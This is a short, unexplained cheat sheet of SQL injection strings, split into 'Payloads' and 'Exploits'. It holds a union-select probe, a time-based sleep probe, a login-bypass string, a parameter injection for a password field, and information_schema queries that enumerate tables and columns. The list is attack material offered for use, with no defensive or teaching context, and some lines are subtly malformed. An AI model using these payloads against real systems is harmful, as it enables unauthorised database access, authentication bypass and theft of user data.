# Payloads

  1. `' union select 1 -- - `
  2. `′ AND sleep (10) `






## Exploits 

  1. `select 1,TABLE_NAME,group_concat(COLUMN_NAME order by COLUMN_NAME asc separator '\n') from information_schema.columns where TABLE_NAME=users`

  2. `admin' union select * from admins -- -`

  3. `'union+select+2 -- -&password=2`

  4. `'union select 1,TABLE_NAME,group_concat(TABLE_NAME order by TABLE_NAME asc separator '\n') from information_schema.table`